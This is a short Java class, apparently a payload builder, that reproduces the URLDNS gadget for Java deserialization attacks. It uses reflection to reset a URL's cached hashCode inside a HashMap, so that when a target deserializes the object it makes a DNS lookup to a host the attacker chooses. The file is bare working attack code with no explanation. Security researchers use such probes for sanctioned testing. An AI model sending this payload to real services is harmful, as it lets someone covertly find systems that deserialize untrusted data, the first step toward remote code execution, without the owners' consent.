import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class UrlDns {
    public static Object getObject(String url1) throws Exception{
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        URL url = new URL(url1);
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 123);
        hashMap.put(url, "Firebasky");
        f.set(url, -1);
        return hashMap;
    }
}